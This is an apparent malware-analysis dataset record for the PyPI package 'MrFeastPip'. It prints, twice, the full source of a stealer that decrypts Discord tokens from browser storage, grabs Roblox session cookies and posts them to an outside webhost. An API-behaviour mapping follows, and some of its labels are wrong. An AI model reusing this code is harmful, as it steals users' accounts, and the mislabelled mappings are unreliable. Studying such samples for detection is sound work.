[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/mrfeastpip-0.7-py3-none-any/MrFeastPip/__init__.py",
    "code_snippet": "import os\n\ndef main():\n\ttry:\n\t\tfrom base64 import b64decode\n\t\tfrom Crypto.Cipher import AES\n\t\tfrom win32crypt import CryptUnprotectData\n\t\tfrom os import getlogin, listdir\n\t\tfrom json import loads\n\t\tfrom re import findall\n\t\tfrom urllib.request import Request, urlopen\n\t\tfrom subprocess import Popen, PIPE\n\t\timport requests\n\t\tfrom datetime import datetime\n\t\timport time\n\t\timport string\n\t\timport random\n\t\timport json\n\t\tfrom termcolor import colored\n\t\timport robloxpy\n\t\timport requests, re\n\t\timport browser_cookie3\n\texcept Exception:\n\t\tos.system(\"py -m pip install -q datetime\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q Crypto\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q win32crypt\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q os\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q json\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q re\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q urllib\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q subprocess\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q requests\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q time\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q string\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q random\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q termcolor\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q robloxpy\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q browser_cookie3\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q discordwebhook\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q datetime\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q datetime\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q datetime\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\t\tos.system(\"py -m pip install -q datetime\")\n\t\tos.system('cls' if os.name == 'nt' else 'clear')\n\n\ttokens = []\n\tcleaned = []\n\tchecker = []\n\n\tdef decrypt(buff, master_key):\n\t\ttry:\n\t\t\treturn AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(\n\t\t\t\tbuff[15:])[:-16].decode()\n\t\texcept:\n\t\t\treturn \"Error\"\n\n\tdef gethwid():\n\t\tp = Popen(\"wmic csproduct get uuid\", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)\n\t\treturn (p.stdout.read() + p.stderr.read()).decode().split(\"\\n\")[1]\n\n\tdef get_token():\n\t\talready_check = []\n\t\tchecker = []\n\t\tlocal = os.getenv('LOCALAPPDATA')\n\t\troaming = os.getenv('APPDATA')\n\t\tchrome = local + \"\\\\Google\\\\Chrome\\\\User Data\"\n\t\tpaths = {\n\t\t\t'Discord': roaming + '\\\\discord',\n\t\t\t'Discord Canary': roaming + '\\\\discordcanary',\n\t\t\t'Lightcord': roaming + '\\\\Lightcord',\n\t\t\t'Discord PTB': roaming + '\\\\discordptb',\n\t\t\t'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',\n\t\t\t'Opera GX': roaming + '\\\\Opera Software\\\\Opera GX Stable',\n\t\t\t'Amigo': local + '\\\\Amigo\\\\User Data',\n\t\t\t'Torch': local + '\\\\Torch\\\\User Data',\n\t\t\t'Kometa': local + '\\\\Kometa\\\\User Data',\n\t\t\t'Orbitum': local + '\\\\Orbitum\\\\User Data',\n\t\t\t'CentBrowser': local + '\\\\CentBrowser\\\\User Data',\n\t\t\t'7Star': local + '\\\\7Star\\\\7Star\\\\User Data',\n\t\t\t'Sputnik': local + '\\\\Sputnik\\\\Sputnik\\\\User Data',\n\t\t\t'Vivaldi': local + '\\\\Vivaldi\\\\User Data\\\\Default',\n\t\t\t'Chrome SxS': local + '\\\\Google\\\\Chrome SxS\\\\User Data',\n\t\t\t'Chrome': chrome + 'Default',\n\t\t\t'Epic Privacy Browser': local + '\\\\Epic Privacy Browser\\\\User Data',\n\t\t\t'Microsoft Edge': local + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul',\n\t\t\t'Uran': local + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default',\n\t\t\t'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default',\n\t\t\t'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',\n\t\t\t'Iridium': local + '\\\\Iridium\\\\User Data\\\\Default'\n\t\t}\n\t\tfor platform, path in paths.items():\n\t\t\tif not os.path.exists(path): continue\n\t\t\ttry:\n\t\t\t\twith open(path + f\"\\\\Local State\", \"r\") as file:\n\t\t\t\t\tkey = loads(file.read())['os_crypt']['encrypted_key']\n\t\t\t\t\tfile.close()\n\t\t\texcept:\n\t\t\t\tcontinue\n\t\t\tfor file in listdir(path + f\"\\\\Local Storage\\\\leveldb\\\\\"):\n\t\t\t\tif not file.endswith(\".ldb\") and file.endswith(\".log\"):\n\t\t\t\t\tcontinue\n\t\t\t\telse:\n\t\t\t\t\ttry:\n\t\t\t\t\t\twith open(path + f\"\\\\Local Storage\\\\leveldb\\\\{file}\", \"r\", errors='ignore') as files:\n\t\t\t\t\t\t\tfor x in files.readlines():\n\t\t\t\t\t\t\t\tx.strip()\n\t\t\t\t\t\t\t\tfor values in findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", x):\n\t\t\t\t\t\t\t\t\ttokens.append(values)\n\t\t\t\t\texcept PermissionError:\n\t\t\t\t\t\tcontinue\n\t\t\tfor i in tokens:\n\t\t\t\tif i.endswith(\"\\\\\"):\n\t\t\t\t\ti.replace(\"\\\\\", \"\")\n\t\t\t\telif i not in cleaned:\n\t\t\t\t\tcleaned.append(i)\n\t\t\tfor token in cleaned:\n\t\t\t\ttry:\n\t\t\t\t\ttok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])\n\t\t\t\texcept IndexError == \"Error\":\n\t\t\t\t\tcontinue\n\t\t\t\tchecker.append(tok)\n\t\t\t\tif tok == 'Error':\n\t\t\t\t\tToken = 'No logged in discord account'\n\t\t\t\t\tcontinue\n\t\t\t\telse:\n\t\t\t\t\tToken = tok\n\t\t\t\theaders = {'Authorization': Token, 'Content-Type': 'application/json'}\n\t\t\t\ttry:\n\t\t\t\t\tres = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)\n\t\t\t\t\treturn Token\n\t\t\t\texcept:\n\t\t\t\t\tcontinue\n\n\tdef getRBS():\n\t\tdata = []\n\t\ttry:\n\t\t\tcookies = browser_cookie3.firefox(domain_name='roblox.com')\n\t\t\tfor cookie in cookies:\n\t\t\t\tif cookie.name == '.ROBLOSECURITY':\n\t\t\t\t\tdata.append(cookies)\n\t\t\t\t\tdata.append(cookie.value)\n\t\t\t\t\treturn data\n\t\texcept:\n\t\t\tpass\n\t\ttry:\n\t\t\tcookies = browser_cookie3.edge(domain_name='roblox.com')\n\t\t\tfor cookie in cookies:\n\t\t\t\tif cookie.name == '.ROBLOSECURITY':\n\t\t\t\t\tdata.append(cookies)\n\t\t\t\t\tdata.append(cookie.value)\n\t\t\t\t\treturn data\n\t\texcept:\n\t\t\tpass\n\t\ttry:\n\t\t\tcookies = browser_cookie3.opera(domain_name='roblox.com')\n\t\t\tfor cookie in cookies:\n\t\t\t\tif cookie.name == '.ROBLOSECURITY':\n\t\t\t\t\tdata.append(cookies)\n\t\t\t\t\tdata.append(cookie.value)\n\t\t\t\t\treturn data\n\t\texcept:\n\t\t\tpass\n\t\ttry:\n\t\t\tcookies = browser_cookie3.chrome(domain_name='roblox.com')\n\t\t\tfor cookie in cookies:\n\t\t\t\tif cookie.name == '.ROBLOSECURITY':\n\t\t\t\t\tdata.append(cookies)\n\t\t\t\t\tdata.append(cookie.value)\n\t\t\t\t\treturn data\n\t\texcept:\n\t\t\tpass\n\n\tRBS = getRBS()\n\n\ttry:\n\t\tRBS = RBS[1]\n\texcept:\n\t\tRBS = 'No logged in account'\n\n\tuserdata = {\"token\": get_token(), \"cookie\": RBS}\n\tresp = requests.post('https://matched-anthem.000webhostapp.com/', params=userdata)\n",
    "pattern_analysis": {
      "api_sequence": [
        "os.system",
        "os.getenv",
        "os.getenv",
        "os.path.exists",
        "open",
        "json.loads",
        "os.listdir",
        "open",
        "re.findall",
        "tokens.append",
        "cleaned.append",
        "decrypt",
        "base64.b64decode",
        "base64.b64decode",
        "requests.get",
        "browser_cookie3.firefox",
        "browser_cookie3.edge",
        "browser_cookie3.opera",
        "browser_cookie3.chrome",
        "requests.post"
      ],
      "api_sequence_with_args": [
        "os.system(\"py -m pip install -q datetime\")",
        "os.getenv('LOCALAPPDATA')",
        "os.getenv('APPDATA')",
        "os.path.exists(path)",
        "open(path + \"\\Local State\", \"r\")",
        "json.loads(file.read())",
        "os.listdir(path + \"\\Local Storage\\leveldb\\\")",
        "open(path + \"\\Local Storage\\leveldb\\{file}\", \"r\", errors='ignore')",
        "re.findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", x)",
        "tokens.append(values)",
        "cleaned.append(i)",
        "decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])",
        "base64.b64decode(token.split('dQw4w9WgXcQ:')[1])",
        "base64.b64decode(key)[5:]",
        "requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)",
        "browser_cookie3.firefox(domain_name='roblox.com')",
        "browser_cookie3.edge(domain_name='roblox.com')",
        "browser_cookie3.opera(domain_name='roblox.com')",
        "browser_cookie3.chrome(domain_name='roblox.com')",
        "requests.post('https://matched-anthem.000webhostapp.com/', params=userdata)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "tokens.append",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "cleaned.append",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "decrypt",
          "id": "decrypt_aes_data",
          "description": "Decrypts data using initialized AES cipher",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "browser_cookie3.firefox",
          "id": "get_firefox_cookies",
          "description": "Retrieves Firefox cookies for specified domain",
          "first_id": "information_gathering",
          "second_id": "browser_data_theft",
          "third_id": "cookie_theft"
        },
        {
          "api_name": "browser_cookie3.edge",
          "id": "get_edge_cookies",
          "description": "Retrieves Edge browser cookies for specified domain",
          "first_id": "information_gathering",
          "second_id": "browser_data_theft",
          "third_id": "cookie_theft"
        },
        {
          "api_name": "browser_cookie3.opera",
          "id": "get_opera_cookies",
          "description": "Retrieves Opera browser cookies for specified domain",
          "first_id": "information_gathering",
          "second_id": "browser_data_theft",
          "third_id": "cookie_theft"
        },
        {
          "api_name": "browser_cookie3.chrome",
          "id": "get_chrome_cookies",
          "description": "Retrieves Chrome browser cookies for specified domain",
          "first_id": "information_gathering",
          "second_id": "browser_data_theft",
          "third_id": "cookie_theft"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        }
      ],
      "contextual_code": "import os\nimport requests\nimport browser_cookie3\nimport json\nimport re\nfrom base64 import b64decode\nfrom Crypto.Cipher import AES\nfrom win32crypt import CryptUnprotectData\nfrom os import getlogin, listdir\nfrom json import loads\nfrom re import findall\nfrom urllib.request import Request, urlopen\nfrom subprocess import Popen, PIPE\n\ndef decrypt(buff, master_key):\n    try:\n        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(\n            buff[15:])[:-16].decode()\n    except:\n        return \"Error\"\n\ndef get_token():\n    tokens = []\n    cleaned = []\n    checker = []\n    local = os.getenv('LOCALAPPDATA')\n    roaming = os.getenv('APPDATA')\n    chrome = local + \"\\\\Google\\\\Chrome\\\\User Data\"\n    paths = { ... }\n    for platform, path in paths.items():\n        if not os.path.exists(path): continue\n        try:\n            with open(path + f\"\\\\Local State\", \"r\") as file:\n                key = loads(file.read())['os_crypt']['encrypted_key']\n        except:\n            continue\n        for file in listdir(path + f\"\\\\Local Storage\\\\leveldb\\\\\"):\n            if not file.endswith(\".ldb\") and file.endswith(\".log\"):\n                continue\n            else:\n                try:\n                    with open(path + f\"\\\\Local Storage\\\\leveldb\\\\{file}\", \"r\", errors='ignore') as files:\n                        for x in files.readlines():\n                            x.strip()\n                            for values in findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", x):\n                                tokens.append(values)\n                except PermissionError:\n                    continue\n        for i in tokens:\n            if i.endswith(\"\\\\\"):\n                i.replace(\"\\\\\", \"\")\n            elif i not in cleaned:\n                cleaned.append(i)\n        for token in cleaned:\n            try:\n                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])\n            except IndexError == \"Error\":\n                continue\n            checker.append(tok)\n            if tok == 'Error':\n                Token = 'No logged in discord account'\n                continue\n            else:\n                Token = tok\n            headers = {'Authorization': Token, 'Content-Type': 'application/json'}\n            try:\n                res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)\n                return Token\n            except:\n                continue\n\ndef getRBS():\n    data = []\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\nRBS = getRBS()\ntry:\n    RBS = RBS[1]\nexcept:\n    RBS = 'No logged in account'\n\nuserdata = {\"token\": get_token(), \"cookie\": RBS}\nresp = requests.post('https://matched-anthem.000webhostapp.com/', params=userdata)\n"
    }
  }
]